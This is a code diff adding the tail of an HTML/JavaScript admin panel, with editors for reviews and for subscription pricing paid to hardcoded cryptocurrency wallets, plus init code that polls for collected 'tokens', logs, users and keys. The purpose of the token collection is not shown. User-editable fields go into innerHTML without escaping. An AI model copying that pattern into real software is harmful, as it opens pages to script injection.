+  currentReviews.forEach((rv,i)=>{
+    const row=document.createElement('div');
+    row.style.cssText='background:var(--sur2);border:1px solid var(--bdr);border-radius:10px;padding:14px;display:flex;flex-direction:column;gap:8px';
+    row.innerHTML=`
+      <div style="display:flex;align-items:center;gap:10px">
+        <label style="font-size:0.7rem;color:var(--mut);font-family:Share Tech Mono,monospace;flex-shrink:0">STARS</label>
+        <select onchange="currentReviews[${i}].stars=parseInt(this.value)" style="width:80px">
+          ${[5,4,3,2,1].map(s=>`<option value="${s}"${rv.stars===s?' selected':''}>${s} ★</option>`).join('')}
+        </select>
+        <label style="font-size:0.7rem;color:var(--mut);font-family:Share Tech Mono,monospace;flex-shrink:0;margin-left:8px">AUTHOR</label>
+        <input type="text" value="${rv.author||''}" placeholder="username" style="flex:1" onchange="currentReviews[${i}].author=this.value">
+        <button class="del-btn" onclick="currentReviews.splice(${i},1);renderReviewEditor()">✕</button>
+      </div>
+      <textarea placeholder="Review text..." style="width:100%;min-height:60px;resize:vertical" onchange="currentReviews[${i}].text=this.value">${rv.text||''}</textarea>`;
+    el.appendChild(row);
+  });
+}
+function addReview(){
+  if(currentReviews.length>=10)return toast('Max 10 reviews','error');
+  currentReviews.push({stars:5,text:'',author:''});
+  renderReviewEditor();
+}
+async function saveReviews(){
+  const r=await apiDB('set_reviews',{reviews:currentReviews});
+  if(r?.ok)toast('Reviews saved!','success');
+  else toast('Save failed','error');
+}
+async function resetReviews(){
+  if(!confirm('Reset to default reviews?'))return;
+  currentReviews=[...DEFAULT_REVIEWS];
+  await apiDB('set_reviews',{reviews:currentReviews});
+  renderReviewEditor();
+  toast('Reset to default','info');
+}
+
+// ══ PRICING ════════════════════════════
+const DEFAULT_PRICING={
+  plans:[
+    {id:'1H',label:'1 Hour',price:2},
+    {id:'1D',label:'1 Day',price:5},
+    {id:'1W',label:'1 Week',price:8},
+    {id:'1M',label:'1 Month',price:12},
+    {id:'LT',label:'Lifetime',price:20,wide:true}
+  ],
+  wallets:{
+    BTC:{symbol:'₿',color:'#f7931a',label:'Bitcoin',address:'bc1qzuw5e2yk3f0s4xtz478lgecjf7a778j8dahn4h'},
+    ETH:{symbol:'Ξ',color:'#627eea',label:'Ethereum',address:'0x37dA20A6F5F28922513b418067DE1afF468F4d8a'},
+    LTC:{symbol:'Ł',color:'#c0c0c0',label:'Litecoin',address:'Lcf7pkW4AMQKFqfQWQRxG4edEXFHoFgn6r'},
+    SOL:{symbol:'◎',color:'#9945ff',label:'Solana',address:'G4drhxouQWVveybE5TKHnzgjHMxhBwxzXwfE1vfFdRnK'}
+  }
+};
+let currentPricing=null;
+async function loadPricingTab(){
+  const r=await apiDB('get_pricing');
+  currentPricing=(r?.ok&&r.data)?r.data:JSON.parse(JSON.stringify(DEFAULT_PRICING));
+  renderPlanEditor();
+  document.getElementById('w-btc').value=currentPricing.wallets.BTC?.address||'';
+  document.getElementById('w-eth').value=currentPricing.wallets.ETH?.address||'';
+  document.getElementById('w-ltc').value=currentPricing.wallets.LTC?.address||'';
+  document.getElementById('w-sol').value=currentPricing.wallets.SOL?.address||'';
+}
+function renderPlanEditor(){
+  const el=document.getElementById('plan-editor');if(!el)return;
+  el.innerHTML='';
+  const plans=currentPricing?.plans||DEFAULT_PRICING.plans;
+  plans.forEach((p,i)=>{
+    const row=document.createElement('div');
+    row.style.cssText='display:flex;align-items:center;gap:10px;background:var(--sur2);border:1px solid var(--bdr);border-radius:8px;padding:10px 14px';
+    row.innerHTML=`
+      <div style="font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--ac);min-width:28px">${p.id}</div>
+      <input type="text" value="${p.label}" style="flex:1" onchange="currentPricing.plans[${i}].label=this.value" placeholder="Label">
+      <div style="display:flex;align-items:center;gap:6px;flex-shrink:0">
+        <span style="color:var(--mut);font-family:'Share Tech Mono',monospace;font-size:0.8rem">$</span>
+        <input type="number" value="${p.price}" style="width:70px" min="0" onchange="currentPricing.plans[${i}].price=parseFloat(this.value)||0" placeholder="Price">
+      </div>`;
+    el.appendChild(row);
+  });
+}
+async function savePricing(){
+  if(!currentPricing)return;
+  currentPricing.wallets.BTC.address=document.getElementById('w-btc').value.trim();
+  currentPricing.wallets.ETH.address=document.getElementById('w-eth').value.trim();
+  currentPricing.wallets.LTC.address=document.getElementById('w-ltc').value.trim();
+  currentPricing.wallets.SOL.address=document.getElementById('w-sol').value.trim();
+  const r=await apiDB('set_pricing',{pricing:currentPricing});
+  if(r?.ok)toast('Pricing saved!','success');
+  else toast('Save failed','error');
+}
+async function resetPricing(){
+  if(!confirm('Reset to default pricing?'))return;
+  currentPricing=JSON.parse(JSON.stringify(DEFAULT_PRICING));
+  await apiDB('set_pricing',{pricing:currentPricing});
+  renderPlanEditor();
+  document.getElementById('w-btc').value=currentPricing.wallets.BTC.address;
+  document.getElementById('w-eth').value=currentPricing.wallets.ETH.address;
+  document.getElementById('w-ltc').value=currentPricing.wallets.LTC.address;
+  document.getElementById('w-sol').value=currentPricing.wallets.SOL.address;
+  toast('Reset to default','info');
+}
+
+// ══ TOAST ═════════════════════════════
+let toT;function toast(m,t='info'){const e=document.getElementById('toast');e.textContent=m;e.className=`show ${t}`;clearTimeout(toT);toT=setTimeout(()=>e.classList.remove('show'),3000);}
+
+// ══ CLOCK ═════════════════════════════
+function tick(){document.getElementById('clk').textContent=new Date().toTimeString().slice(0,8);}setInterval(tick,1000);tick();
+
+// ══ INIT ══════════════════════════════
+async function init(){
+  const cfg=getAWHCfg();
+  if(cfg.url)document.getElementById('adm-wh').value=cfg.url;
+  const pcfg=getPerfWHCfg();
+  if(pcfg.url)document.getElementById('perf-wh').value=pcfg.url;
+  const scfg=getStatusWHCfg();
+  if(scfg.url)document.getElementById('status-wh').value=scfg.url;
+  const dcInvite=localStorage.getItem('bra_dc_invite');
+  if(dcInvite){const el=document.getElementById('discord-invite');if(el)el.value=dcInvite;}
+  const tokens=await getTokens();lastTokenCount=tokens.length;
+  renderLogs();renderTokens();renderUsers();renderKeys();
+  renderServices();updateOverallBadge();
+  updatePerfStats();measurePing();
+  // Load extra stats
+  apiDB('get_reviews').then(r=>{const el=document.getElementById('sa-reviews');if(el&&r?.ok)el.textContent=(r.data||[]).length;});
+  apiDB('get_payments').then(r=>{const el=document.getElementById('sa-payments');if(el&&r?.ok)el.textContent=(r.data||[]).filter(p=>p.status==='confirmed').length;});
+  startStatusAutoPing();
+  startPerfAutoPing();
+  if(getStatusWHCfg().url){const r=document.getElementById('status-countdown-row');if(r)r.style.display='';}
+  if(getPerfWHCfg().url){const r=document.getElementById('perf-countdown-row');if(r)r.style.display='';}
+  setInterval(checkNewTokens,10000);
+  setInterval(()=>{renderLogs();renderTokens();renderUsers();updatePerfStats();},15000);
+}
+if(sessionStorage.getItem('zwa')){
+  document.getElementById('login').style.display='none';
+  document.getElementById('main').style.display='block';
+  init();
+}
+</script>
+</body>
+</html>
